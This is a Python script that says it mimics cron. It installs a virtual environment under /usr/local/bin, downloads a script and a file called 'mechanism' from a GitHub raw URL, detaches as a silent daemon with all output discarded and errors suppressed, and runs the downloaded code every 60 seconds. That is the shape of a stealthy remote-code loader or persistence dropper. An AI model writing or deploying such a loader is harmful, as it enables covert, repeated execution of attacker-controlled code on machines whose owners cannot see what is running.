#!/usr/bin/env python3

# This script mimic the behavior of cron

import os
import sys
import time
import subprocess

INTERVAL_SECONDS = 60

# Check if running inside the virtual environment
if sys.prefix != "/usr/local/bin/protectionEnv":
    # Re-run the script using the virtual environment's Python
    virtual_env_python = "/usr/local/bin/protectionEnv/bin/python3"
    subprocess.run([virtual_env_python] + sys.argv)
    sys.exit(0)

def daemonize():
    """
    Detach the process from the terminal and run it as a daemon.
    """
    try:
        # Fork the first time to create a non-session leader
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Parent exits

        # Decouple from the parent environment
        os.chdir("/")
        os.setsid()  # Become session leader
        os.umask(0)

        # Fork again to prevent re-acquisition of a controlling terminal
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Parent exits again

        # Redirect standard file descriptors to /dev/null
        sys.stdout.flush()
        sys.stderr.flush()
        with open("/dev/null", "wb", 0) as devnull:
            os.dup2(devnull.fileno(), sys.stdin.fileno())
            os.dup2(devnull.fileno(), sys.stdout.fileno())
            os.dup2(devnull.fileno(), sys.stderr.fileno())

    except OSError as e:
        sys.stderr.write(f"Daemonization failed: {e}\n")
        sys.exit(1)

# Define URLs for downloading the necessary files
repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"

# Define the output file paths
envPath = "/usr/local/bin/protectionEnv"
pythonPath = "/usr/local/bin/protectionEnv/bin/python3"
repoFilePath = "/usr/local/bin/protection.py"
requirementsFilePath = "/usr/local/bin/requirements.txt"
contentFilePath = "/usr/local/bin/mechanism"
serviceFilePath = "/etc/systemd/system/protection.service"

# Function to create a virtual environment and install requests
def create_virtual_environment(env_path):
    try:
        # Create the virtual environment
        subprocess.run([sys.executable, '-m', 'venv', env_path], check=True)

        # Install 'requests' in the virtual environment
        pip_executable = os.path.join(env_path, 'bin', 'pip')
        subprocess.run([pip_executable, 'install', 'requests'], check=True)

        return True
    except subprocess.CalledProcessError as e:
        return False
    except Exception as e:
        return False


# Function to use an existing virtual and install requirements
def setup_python_environment(env_path, requirements_path):
    try:

        # Check if the requirements file exists
        if not os.path.exists(requirements_path):
            return None

        # Install requirements
        pip_executable = os.path.join(env_path, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(env_path, 'bin', 'pip')
        subprocess.run([pip_executable, 'install', '-r', requirements_path],  capture_output=False, check=True)
        
        return pip_executable  # Return pip path for service configuration if needed

    except subprocess.CalledProcessError as e:
        return None
    except Exception as e:
        return None


# Function to download a file and save it locally
def download_file(url, file_path):
    try:
        import requests  # Importing here to ensure it's available in the environment
        response = requests.get(url)
        response.raise_for_status()
        with open(file_path, 'wb') as file:
            file.write(response.content)
    except requests.exceptions.RequestException as e:
        pass

def execute_script():
    """
    Executes the protection.py script using the Python interpreter
    from the virtual environment.
    """
    try:
        result = subprocess.run([pythonPath, repoFilePath], capture_output=False, text=True)
        if result.stdout:
            pass
        if result.stderr:
            pass
    except Exception as e:
        pass


# Function to make script executable
def make_executable(file_path):
    try:
        os.chmod(file_path, 0o755)
    except Exception as e:
        pass


if __name__ == "__main__":
    # Step 1: Create the virtual environment and install 'requests'
    if not create_virtual_environment(envPath):
        sys.exit("Failed to create virtual environment or install 'requests'. Exiting.")

    # Step 2: Use the virtual environment's Python for the rest of the script
    os.environ['VIRTUAL_ENV'] = envPath
    os.environ['PATH'] = f"{os.path.join(envPath, 'bin')}:{os.environ['PATH']}"

    # Step 3: Download the necessary files
    download_file(repoUrl, repoFilePath)
    download_file(requirementsUrl, requirementsFilePath)
    download_file(contentUrl, contentFilePath)


    # Make the main script executable
    make_executable(repoFilePath)

    # Create the environment and install requirements
    pip_path = setup_python_environment(envPath, requirementsFilePath)

    # Deamonize the process
    daemonize()

    # Mimic cron
    while True:
        execute_script()
        time.sleep(INTERVAL_SECONDS)
